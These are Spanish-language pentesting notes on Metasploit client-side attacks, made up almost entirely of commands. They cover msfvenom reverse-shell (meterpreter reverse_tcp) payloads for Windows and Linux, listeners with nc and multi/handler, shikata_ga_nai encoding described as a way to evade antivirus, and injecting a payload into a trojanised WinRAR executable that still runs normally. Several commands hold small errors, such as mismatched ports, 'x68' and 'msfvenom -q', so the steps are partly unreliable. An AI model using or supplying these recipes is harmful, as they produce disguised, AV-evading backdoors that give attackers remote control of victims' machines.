# Ataques del lado del cliente con Metasploit 

Tags: #Metasploit #Msfvenom #Encode #Payloads #Shellcode #AntiVirus #InjectPayloads #Automatizar

* Client-Side Attacks: Es un vector de ataque hace que un cliente ejecute un payload malicioso en su sistema que consecuentemente hará una conexión trasera con un atacante cuando sea ejecutado. Utiliza documentos o archivos ejecutables. 

## Msfvenom Payloads

Msfconsole: Es una utilidad de línea de comando que puede ser usada para generar y encodear payloads MSF para varios sistemas operativos, así, como servidores web. Es la combinación de dos utilidades: Msfpayload y Msfencode. Podemos utilizar Msfvenom para generar payloads maliciosos en Meterpreter que pueden ser transferidos al sistema del cliente. Una vez ejecutados, harán una conexión a nuestro payload handler y nos proveerá un acceso remoto al sistema target.  

### Para Windows 

```bash 
1. Debemos crear el Msfvenom en nuestra maquina Linux 

❯ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -f exe > /home/kali/Desktop/payloadx86.exe

	# LHOST = IP de atacante 
	# LHOST = Puerto de atacante 
	# p = Payload
	# a = Arquitectura x64, x86
	# f = Formato de salida y la ruta en donde nos lo creara (exe, war, etc...)

❯ msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -f exe > /home/kali/Desktop/payloadx64.exe
```

```bash 
2. Debemos de transferir el archivo a la maquina victima Windows 
```

```bash
3. Nos ponemos en escucha para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
❯ rlwrap nc -nlvp 443
```

```bash 
3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
# Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'

❯ msfconsole -q                 # q = Quitar el banner de inicio

	❯ use multi/handler                 
	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
	❯ options
	❯ set LHOST ❮IP❯                     
	❯ set LPORT 1234
	❯ run
```

### Para Linux 

```bash 
1. Debemos crear el Msfvenom en nuestra maquina Linux 

❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -f elf > ~/Desktop/payloadx86

	# LHOST = IP de atacante 
	# LHOST = Puerto de atacante 
	# p = Payload
	# a = Arquitectura x64, x86
	# f = Formato de salida y la ruta en donde nos lo creara (elf, exe, war, etc...) y podemos o no agregarle la extension 

❯ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -f elf > ~/Desktop/payloadx64
```

```bash 
2. Debemos de transferir el archivo a la maquina victima Linux 
```

```bash
3. Nos ponemos en escucha para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
❯ nc -nlvp 443
```

```bash 
3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
# Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'

❯ msfconsole -q                   # q = Quitar el banner de inicio

	❯ use multi/handler                 
	❯ set payload linux/x68/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
	❯ options
	❯ set LHOST ❮IP❯                    
	❯ set LPORT 1234
	❯ run
```

## Encodear Payload con MSF

* Se utiliza el encodeamiento de los payload ya que los atacantes después de transferir y almacenar los payloads maliciosos en los discos duros de los clientes, los atacantes necesitan estar consientes de la detección de los Antivirus (AV).  Los usuarios finales de soluciones de AV utilizan detección basada en orden para identificar archivos o ejecutables maliciosos. Podemos evadir los AV encodeando nuestros payloads. Encodear es un proceso de modificar el Shellcode del payload con el objetivo de modificar la firma del payload. 

* Shellcode: Es una pieza de código típicamente usada como un payload para explotación. 

```bash 
❯ msfconsole --list encoders               # Lista de encoders
```

### Para Windows 

```bash 
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodex86.exe
	# e = Nombre del encoder 


❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodex86.exe

	# e = Nombre del encoder 
	# i = Iteraciones 
```

```bash 
2. Debemos de transferir el archivo a la maquina victima Windows 
```

```bash
3. Nos ponemos en escucha para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
❯ rlwrap nc -nlvp 443
```

```bash 
3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
# Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'

❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use multi/handler                 
	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
	❯ options
	❯ set LHOST ❮IP❯                     
	❯ set LPORT 1234
	❯ run
```

### Para Linux 

```bash 
❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -i 10 -e x86/shikata_ga_nai -f elf > /home/kali/Desktop/encodex86

	# e = Nombre del encoder 
	# i = Iteraciones 
```

```bash 
2. Debemos de transferir el archivo a la maquina victima Linux 
```

```bash
3. Nos ponemos en escucha para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
❯ nc -nlvp 443
```

```bash 
3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
# Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'

❯ msfconsole -q                   # q = Quitar el banner de inicio

	❯ use multi/handler                 
	❯ set payload linux/x68/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
	❯ options
	❯ set LHOST ❮IP❯                     
	❯ set LPORT 1234
	❯ run
```


## Inyectar Payload dentro de ejecutables portables de Windows 

```bash 
1. Debemos descargar un archivo ejecutable de Google (WinRAR = wrar6.exe)
```

```bash 
# Creamos el payload y se lo pasamos a un archivo ejecutable 'confiable'
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar6.exe > ~/Desktop/Winrar.exe
	# x = Especificar el archivo ejecutable para usar como plantilla (No inicia el proceso del archivo ejecutable)

❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=❮IP❯ LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar6.exe > ~/Desktop/Winrar.exe
	# k = Preserva la plantilla con el comportamiento original del ejecutable y ademas inyecta el payload (Inicia normal el proceso del archivo ejecutable)
```

```bash 
2. Debemos de transferir el archivo a la maquina victima Windows 
```

```bash
3. Nos ponemos en escucha para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
❯ rlwrap nc -nlvp 443
```

```bash 
3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
# Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'

❯ msfvenom -q                  # q = Quitar el banner de inicio

	❯ use multi/handler                 
	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
	❯ options
	❯ set LHOST ❮IP❯                    
	❯ set LPORT 1234
	❯ run
```